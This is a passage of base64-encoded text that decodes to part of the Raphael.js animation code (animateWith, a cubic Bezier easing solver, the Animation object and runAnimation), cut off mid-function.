1hdGlvbiB0byBydW5cbiAgICAgLSBlYXNpbmcgKHN0cmluZykgI29wdGlvbmFsIGVhc2luZyB0eXBlLiBBY2NlcHQgb24gb2YgQFJhcGhhZWwuZWFzaW5nX2Zvcm11bGFzIG9yIENTUyBmb3JtYXQ6IGBjdWJpYyYjeDIwMTA7YmV6aWVyKFhYLCYjMTYwO1hYLCYjMTYwO1hYLCYjMTYwO1hYKWBcbiAgICAgLSBjYWxsYmFjayAoZnVuY3Rpb24pICNvcHRpb25hbCBjYWxsYmFjayBmdW5jdGlvbi4gV2lsbCBiZSBjYWxsZWQgYXQgdGhlIGVuZCBvZiBhbmltYXRpb24uXG4gICAgICogb3JcbiAgICAgLSBlbGVtZW50IChvYmplY3QpIGVsZW1lbnQgdG8gc3luYyB3aXRoXG4gICAgIC0gYW5pbSAob2JqZWN0KSBhbmltYXRpb24gdG8gc3luYyB3aXRoXG4gICAgIC0gYW5pbWF0aW9uIChvYmplY3QpICNvcHRpb25hbCBhbmltYXRpb24gb2JqZWN0LCBzZWUgQFJhcGhhZWwuYW5pbWF0aW9uXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgb3JpZ2luYWwgZWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLmFuaW1hdGVXaXRoID0gZnVuY3Rpb24gKGVsLCBhbmltLCBwYXJhbXMsIG1zLCBlYXNpbmcsIGNhbGxiYWNrKSB7XG4gICAgICAgIHZhciBlbGVtZW50ID0gdGhpcztcbiAgICAgICAgaWYgKGVsZW1lbnQucmVtb3ZlZCkge1xuICAgICAgICAgICAgY2FsbGJhY2sgJiYgY2FsbGJhY2suY2FsbChlbGVtZW50KTtcbiAgICAgICAgICAgIHJldHVybiBlbGVtZW50O1xuICAgICAgICB9XG4gICAgICAgIHZhciBhID0gcGFyYW1zIGluc3RhbmNlb2YgQW5pbWF0aW9uID8gcGFyYW1zIDogUi5hbmltYXRpb24ocGFyYW1zLCBtcywgZWFzaW5nLCBjYWxsYmFjayksXG4gICAgICAgICAgICB4LCB5O1xuICAgICAgICBydW5BbmltYXRpb24oYSwgZWxlbWVudCwgYS5wZXJjZW50c1swXSwgbnVsbCwgZWxlbWVudC5hdHRyKCkpO1xuICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBhbmltYXRpb25FbGVtZW50cy5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICBpZiAoYW5pbWF0aW9uRWxlbWVudHNbaV0uYW5pbSA9PSBhbmltICYmIGFuaW1hdGlvbkVsZW1lbnRzW2ldLmVsID09IGVsKSB7XG4gICAgICAgICAgICAgICAgYW5pbWF0aW9uRWxlbWVudHNbaWkgLSAxXS5zdGFydCA9IGFuaW1hdGlvbkVsZW1lbnRzW2ldLnN0YXJ0O1xuICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiBlbGVtZW50O1xuICAgICAgICAvL1xuICAgICAgICAvL1xuICAgICAgICAvLyB2YXIgYSA9IHBhcmFtcyA/IFIuYW5pbWF0aW9uKHBhcmFtcywgbXMsIGVhc2luZywgY2FsbGJhY2spIDogYW5pbSxcbiAgICAgICAgLy8gICAgIHN0YXR1cyA9IGVsZW1lbnQuc3RhdHVzKGFuaW0pO1xuICAgICAgICAvLyByZXR1cm4gdGhpcy5hbmltYXRlKGEpLnN0YXR1cyhhLCBzdGF0dXMgKiBhbmltLm1zIC8gYS5tcyk7XG4gICAgfTtcbiAgICBmdW5jdGlvbiBDdWJpY0JlemllckF0VGltZSh0LCBwMXgsIHAxeSwgcDJ4LCBwMnksIGR1cmF0aW9uKSB7XG4gICAgICAgIHZhciBjeCA9IDMgKiBwMXgsXG4gICAgICAgICAgICBieCA9IDMgKiAocDJ4IC0gcDF4KSAtIGN4LFxuICAgICAgICAgICAgYXggPSAxIC0gY3ggLSBieCxcbiAgICAgICAgICAgIGN5ID0gMyAqIHAxeSxcbiAgICAgICAgICAgIGJ5ID0gMyAqIChwMnkgLSBwMXkpIC0gY3ksXG4gICAgICAgICAgICBheSA9IDEgLSBjeSAtIGJ5O1xuICAgICAgICBmdW5jdGlvbiBzYW1wbGVDdXJ2ZVgodCkge1xuICAgICAgICAgICAgcmV0dXJuICgoYXggKiB0ICsgYngpICogdCArIGN4KSAqIHQ7XG4gICAgICAgIH1cbiAgICAgICAgZnVuY3Rpb24gc29sdmUoeCwgZXBzaWxvbikge1xuICAgICAgICAgICAgdmFyIHQgPSBzb2x2ZUN1cnZlWCh4LCBlcHNpbG9uKTtcbiAgICAgICAgICAgIHJldHVybiAoKGF5ICogdCArIGJ5KSAqIHQgKyBjeSkgKiB0O1xuICAgICAgICB9XG4gICAgICAgIGZ1bmN0aW9uIHNvbHZlQ3VydmVYKHgsIGVwc2lsb24pIHtcbiAgICAgICAgICAgIHZhciB0MCwgdDEsIHQyLCB4MiwgZDIsIGk7XG4gICAgICAgICAgICBmb3IodDIgPSB4LCBpID0gMDsgaSA8IDg7IGkrKykge1xuICAgICAgICAgICAgICAgIHgyID0gc2FtcGxlQ3VydmVYKHQyKSAtIHg7XG4gICAgICAgICAgICAgICAgaWYgKGFicyh4MikgPCBlcHNpbG9uKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB0MjtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgZDIgPSAoMyAqIGF4ICogdDIgKyAyICogYngpICogdDIgKyBjeDtcbiAgICAgICAgICAgICAgICBpZiAoYWJzKGQyKSA8IDFlLTYpIHtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIHQyID0gdDIgLSB4MiAvIGQyO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdDAgPSAwO1xuICAgICAgICAgICAgdDEgPSAxO1xuICAgICAgICAgICAgdDIgPSB4O1xuICAgICAgICAgICAgaWYgKHQyIDwgdDApIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gdDA7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAodDIgPiB0MSkge1xuICAgICAgICAgICAgICAgIHJldHVybiB0MTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHdoaWxlICh0MCA8IHQxKSB7XG4gICAgICAgICAgICAgICAgeDIgPSBzYW1wbGVDdXJ2ZVgodDIpO1xuICAgICAgICAgICAgICAgIGlmIChhYnMoeDIgLSB4KSA8IGVwc2lsb24pIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHQyO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBpZiAoeCA+IHgyKSB7XG4gICAgICAgICAgICAgICAgICAgIHQwID0gdDI7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgdDEgPSB0MjtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgdDIgPSAodDEgLSB0MCkgLyAyICsgdDA7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gdDI7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHNvbHZlKHQsIDEgLyAoMjAwICogZHVyYXRpb24pKTtcbiAgICB9XG4gICAgZWxwcm90by5vbkFuaW1hdGlvbiA9IGZ1bmN0aW9uIChmKSB7XG4gICAgICAgIGYgPyBldmUub24oXCJyYXBoYWVsLmFuaW0uZnJhbWUuXCIgKyB0aGlzLmlkLCBmKSA6IGV2ZS51bmJpbmQoXCJyYXBoYWVsLmFuaW0uZnJhbWUuXCIgKyB0aGlzLmlkKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBmdW5jdGlvbiBBbmltYXRpb24oYW5pbSwgbXMpIHtcbiAgICAgICAgdmFyIHBlcmNlbnRzID0gW10sXG4gICAgICAgICAgICBuZXdBbmltID0ge307XG4gICAgICAgIHRoaXMubXMgPSBtcztcbiAgICAgICAgdGhpcy50aW1lcyA9IDE7XG4gICAgICAgIGlmIChhbmltKSB7XG4gICAgICAgICAgICBmb3IgKHZhciBhdHRyIGluIGFuaW0pIGlmIChhbmltW2hhc10oYXR0cikpIHtcbiAgICAgICAgICAgICAgICBuZXdBbmltW3RvRmxvYXQoYXR0cildID0gYW5pbVthdHRyXTtcbiAgICAgICAgICAgICAgICBwZXJjZW50cy5wdXNoKHRvRmxvYXQoYXR0cikpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcGVyY2VudHMuc29ydChzb3J0QnlOdW1iZXIpO1xuICAgICAgICB9XG4gICAgICAgIHRoaXMuYW5pbSA9IG5ld0FuaW07XG4gICAgICAgIHRoaXMudG9wID0gcGVyY2VudHNbcGVyY2VudHMubGVuZ3RoIC0gMV07XG4gICAgICAgIHRoaXMucGVyY2VudHMgPSBwZXJjZW50cztcbiAgICB9XG4gICAgLypcXFxuICAgICAqIEFuaW1hdGlvbi5kZWxheVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQ3JlYXRlcyBhIGNvcHkgb2YgZXhpc3RpbmcgYW5pbWF0aW9uIG9iamVjdCB3aXRoIGdpdmVuIGRlbGF5LlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBkZWxheSAobnVtYmVyKSBudW1iZXIgb2YgbXMgdG8gcGFzcyBiZXR3ZWVuIGFuaW1hdGlvbiBzdGFydCBhbmQgYWN0dWFsIGFuaW1hdGlvblxuICAgICAqKlxuICAgICA9IChvYmplY3QpIG5ldyBhbHRlcmVkIEFuaW1hdGlvbiBvYmplY3RcbiAgICAgfCB2YXIgYW5pbSA9IFJhcGhhZWwuYW5pbWF0aW9uKHtjeDogMTAsIGN5OiAyMH0sIDJlMyk7XG4gICAgIHwgY2lyY2xlMS5hbmltYXRlKGFuaW0pOyAvLyBydW4gdGhlIGdpdmVuIGFuaW1hdGlvbiBpbW1lZGlhdGVseVxuICAgICB8IGNpcmNsZTIuYW5pbWF0ZShhbmltLmRlbGF5KDUwMCkpOyAvLyBydW4gdGhlIGdpdmVuIGFuaW1hdGlvbiBhZnRlciA1MDAgbXNcbiAgICBcXCovXG4gICAgQW5pbWF0aW9uLnByb3RvdHlwZS5kZWxheSA9IGZ1bmN0aW9uIChkZWxheSkge1xuICAgICAgICB2YXIgYSA9IG5ldyBBbmltYXRpb24odGhpcy5hbmltLCB0aGlzLm1zKTtcbiAgICAgICAgYS50aW1lcyA9IHRoaXMudGltZXM7XG4gICAgICAgIGEuZGVsID0gK2RlbGF5IHx8IDA7XG4gICAgICAgIHJldHVybiBhO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEFuaW1hdGlvbi5yZXBlYXRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIENyZWF0ZXMgYSBjb3B5IG9mIGV4aXN0aW5nIGFuaW1hdGlvbiBvYmplY3Qgd2l0aCBnaXZlbiByZXBldGl0aW9uLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSByZXBlYXQgKG51bWJlcikgbnVtYmVyIGl0ZXJhdGlvbnMgb2YgYW5pbWF0aW9uLiBGb3IgaW5maW5pdGUgYW5pbWF0aW9uIHBhc3MgYEluZmluaXR5YFxuICAgICAqKlxuICAgICA9IChvYmplY3QpIG5ldyBhbHRlcmVkIEFuaW1hdGlvbiBvYmplY3RcbiAgICBcXCovXG4gICAgQW5pbWF0aW9uLnByb3RvdHlwZS5yZXBlYXQgPSBmdW5jdGlvbiAodGltZXMpIHtcbiAgICAgICAgdmFyIGEgPSBuZXcgQW5pbWF0aW9uKHRoaXMuYW5pbSwgdGhpcy5tcyk7XG4gICAgICAgIGEuZGVsID0gdGhpcy5kZWw7XG4gICAgICAgIGEudGltZXMgPSBtYXRoLmZsb29yKG1tYXgodGltZXMsIDApKSB8fCAxO1xuICAgICAgICByZXR1cm4gYTtcbiAgICB9O1xuICAgIGZ1bmN0aW9uIHJ1bkFuaW1hdGlvbihhbmltLCBlbGVtZW50LCBwZXJjZW50LCBzdGF0dXMsIHRvdGFsT3JpZ2luLCB0aW1lcykge1xuICAgICAgICBwZXJjZW50ID0gdG9GbG9hdChwZXJjZW50KTtcbiAgICAgICAgdmFyIHBhcmFtcyxcbiAgICAgICAgICAgIGlzSW5BbmltLFxuICAgICAgICAgICAgaXNJbkFuaW1TZXQsXG4gICAgICAgICAgICBwZXJjZW50cyA9IFtdLFxuICAgICAgICAgICAgbmV4dCxcbiAgICAgICAgICAgIHByZXYsXG4gICAgICAgICAgICB0aW1lc3RhbXAsXG4gICAgICAgICAgICBtcyA9IGFuaW0ubXMsXG4gICAgICAgICAgICBmcm9tID0ge30sXG4gICAgICAgICAgICB0byA9IHt9LFxuICAgICAgICAgICAgZGlmZiA9IHt9O1xuICAgICAgICBpZiAoc3RhdHVzKSB7XG4gICAgICAgICAgICBmb3IgKGkgPSAwLCBpaSA9IGFuaW1hdGlvbkVsZW1lbnRzLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICB2YXIgZSA9IGFuaW1hdGlvbkVsZW1lbnRzW2ldO1xuICAgICAgICAgICAgICAgIGlmIChlLmVsLmlkID09IGVsZW1lbnQuaWQgJiYgZS5hbmltID09IGFuaW0pIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGUucGVyY2VudCAhPSBwZXJjZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBhbmltYXRpb25FbGVtZW50cy5zcGxpY2UoaSwgMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBpc0luQW5pbVNldCA9IDE7XG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpc0luQW5pbSA9IGU7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgZWxlbWVudC5hdHRyKGUudG90YWxPcmlnaW4pO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzdGF0dXMgPSArdG87IC8vIE5hTlxuICAgICAgICB9XG4gICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IGFuaW0ucGVyY2VudHMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgaWYgKGFuaW0ucGVyY2VudHNbaV0gPT0gcGVyY2VudCB8fCBhbmltLnBlcmNlbnRzW2ldID4gc3RhdHVzICogYW5pbS50b3ApIHtcbiAgICAgICAgICAgICAgICBwZXJjZW50ID0gYW5pbS5wZXJjZW50c1tpXTtcbiAgICAgICAgICAgICAgICBwcmV2ID0gYW5pbS5wZXJjZW50c1tpIC0gMV0gfHwgMDtcbiAgICAgICAgICAgICAgICBtcyA9IG1zIC8gYW5pbS50b3AgKiAocGVyY2VudCAtIHByZXYpO1xuICAgICAgICAgICAgICAgIG5leHQgPSBhbmltLnBlcmNlbnRzW2kgKyAxXTtcbiAgICAgICAgICAgICAgICBwYXJhbXMgPSBhbmltLmFuaW1bcGVyY2VudF07XG4gICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9IGVsc2UgaWYgKHN0YXR1cykge1xuICAgICAgICAgICAgICAgIGVsZW1lbnQuYXR0cihhbmltLmFuaW1bYW5pbS5wZXJjZW50c1tpXV0pO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGlmICghcGFyYW1zKSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFpc0luQW5pbSkge1xuICAgICAgICAgICAgZm9yICh2YXIgYXR0ciBpbiBwYXJhbXMpIGlmIChwYXJhbXNbaGFzXShhdHRyKSkge1xuICAgICAgICAgICAgICAgIGlmIChhdmFpbGFibGVBbmltQXR0cnNbaGFzXShhdHRyKSB8fCBlbGVtZW50LnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbaGFzXShhdHRyKSkge1xuICAgICAgICAgICAgICAgICAgICBmcm9tW2F0dHJdID0gZWxlbWVudC5hdHRyKGF0dHIpO1xuICAgICAgICAgICAgICAgICAgICAoZnJvbVthdHRyXSA9PSBudWxsKSAmJiAoZnJvbVthdHRyXSA9IGF2YWlsYWJsZUF0dHJzW2F0dHJdKTtcbiAgICAgICAgICAgICAgICAgICAgdG9bYXR0cl0gPSBwYXJhbXNbYXR0cl07XG4gICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoYXZhaWxhYmxlQW5pbUF0dHJzW2F0dHJdKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIG51OlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpZmZbYXR0cl0gPSAodG9bYXR0cl0gLSBmcm9tW2F0dHJdKSAvIG1zO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcImNvbG91clwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyb21bYXR0cl0gPSBSLmdldFJHQihmcm9tW2F0dHJdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgdG9Db2xvdXIgPSBSLmdldFJHQih0b1thdHRyXSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXSA9IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcjogKHRvQ29sb3VyLnIgLSBmcm9tW2F0dHJdLnIpIC8gbXMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGc6ICh0b0NvbG91ci5nIC0gZnJvbVthdHRyXS5nKSAvIG1zLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiOiAodG9Db2xvdXIuYiAtIGZyb21bYXR0cl0uYikgLyBtc1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwicGF0aFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXRoZXMgPSBwYXRoMmN1cnZlKGZyb21bYXR0cl0sIHRvW2F0dHJdKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9QYXRoID0gcGF0aGVzWzFdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyb21bYXR0cl0gPSBwYXRoZXNbMF07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaSA9IDAsIGlpID0gZnJvbVthdHRyXS5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpZmZbYXR0cl1baV0gPSBbMF07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSAxLCBqaiA9IGZyb21bYXR0cl1baV0ubGVuZ3RoOyBqIDwgamo7IGorKykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXVtpXVtqXSA9ICh0b1BhdGhbaV1bal0gLSBmcm9tW2F0dHJdW2ldW2pdKSAvIG1zO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcInRyYW5zZm9ybVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBfID0gZWxlbWVudC5fLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcSA9IGVxdWFsaXNlVHJhbnNmb3JtKF9bYXR0cl0sIHRvW2F0dHJdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnJvbVthdHRyXSA9IGVxLmZyb207XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvW2F0dHJdID0gZXEudG87XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpZmZbYXR0cl0gPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXS5yZWFsID0gdHJ1ZTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChpID0gMCwgaWkgPSBmcm9tW2F0dHJdLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpZmZbYXR0cl1baV0gPSBbZnJvbVthdHRyXVtpXVswXV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGogPSAxLCBqaiA9IGZyb21bYXR0cl1baV0ubGVuZ3RoOyBqIDwgamo7IGorKykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpZmZbYXR0cl1baV1bal0gPSAodG9bYXR0cl1baV1bal0gLSBmcm9tW2F0dHJdW2ldW2pdKSAvIG1zO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG0gPSAoZWxlbWVudC5tYXRyaXggfHwgbmV3IE1hdHJpeCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0bzIgPSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXzoge3RyYW5zZm9ybTogXy50cmFuc2Zvcm19LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdldEJCb3g6IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGVsZW1lbnQuZ2V0QkJveCgxKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcm9tW2F0dHJdID0gW1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5hLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5iLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5jLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5mXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhY3RUcmFuc2Zvcm0odG8yLCB0b1thdHRyXSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvW2F0dHJdID0gdG8yLl8udHJhbnNmb3JtO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaWZmW2F0dHJdID0gW1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKHRvMi5tYXRyaXguYSAtIG0uYSkgLyBtcyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICh0bzIubWF0cml4LmIgLSBtLmIpIC8gbXMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAodG8yLm1hdHJpeC5jIC0gbS5jKSAvIG1zLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKHRvMi5tYXRyaXguZCAtIG0uZCkgLyBtcyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICh0bzIubWF0cml4LmUgLSBtLmUpIC8gbXMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAodG8yLm1hdHJpeC5mIC0gbS5mKSAvIG1zXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGZyb21bYXR0cl0gPSBbXy5zeCwgXy5zeSwgXy5kZWcsIF8uZHgsIF8uZHldO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyB2YXIgdG8yID0ge186e30sIGdldEJCb3g6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIGVsZW1lbnQuZ2V0QkJveCgpOyB9fTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gZXh0cmFjdFRyYW5zZm9ybSh0bzIsIHRvW2F0dHJdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gZGlmZlthdHRyXSA9IFtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gICAgICh0bzIuXy5zeCAtIF8uc3gpIC8gbXMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vICAgICAodG8yLl8uc3kgLSBfLnN5KSAvIG1zLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAgICAgKHRvMi5fLmRlZyAtIF8uZGVnKSAvIG1zLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAgICAgKHRvMi5fLmR4IC0gXy5keCkgLyBtcyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gICAgICh0bzIuXy5keSAtIF8uZHkpIC8gbXNcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwiY3N2XCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlcyA9IFN0cihwYXJhbXNbYXR0cl0pW3NwbGl0XShzZXBhcmF0b3IpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcm9tMiA9IFN0cihmcm9tW2F0dHJdKVtzcGxpdF0oc2VwYXJhdG9yKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXR0ciA9PSBcImNsaXAtcmVjdFwiKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyb21bYXR0cl0gPSBmcm9tMjtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpID0gZnJvbTIubGVuZ3RoO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoaS0tKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaWZmW2F0dHJdW2ldID0gKHZhbHVlc1tpXSAtIGZyb21bYXR0cl1baV0pIC8gbXM7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9bYXR0cl0gPSB2YWx1ZXM7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0OlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlcyA9IFtdW2NvbmNhdF0ocGFyYW1zW2F0dHJdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcm9tMiA9IFtdW2NvbmNhdF0oZnJvbVthdHRyXSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGkgPSBlbGVtZW50LnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbYXR0cl0ubGVuZ3RoO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChpLS0pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlmZlthdHRyXVtpXSA9ICgodmFsdWVzW2ldIHx8IDApIC0gKGZyb20yW2ldIHx8IDApKSAvIG1zO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHZhciBlYXNpbmcgPSBwYXJhbXMuZWFzaW5nLFxuICAgICAgICAgICAgICAgIGVhc3llYXN5ID0gUi5lYXNpbmdfZm9ybXVsYXNbZWFzaW5nXTtcbiAgICAgICAgICAgIGlmICghZWFzeWVhc3kpIHtcbiAgICAgICAgICAgICAgICBlYXN5ZWFzeSA9IFN0cihlYXNpbmcpLm1hdGNoKGJlemllcnJnKTtcbiAgICAgICAgICAgICAgICBpZiAoZWFzeWVhc3kgJiYgZWFzeWVhc3kubGVuZ3RoID09IDUpIHtcbiAgICAgICAgICAgICAgICAgICAgdmFyIGN1cnZlID0gZWFzeWVhc3k7XG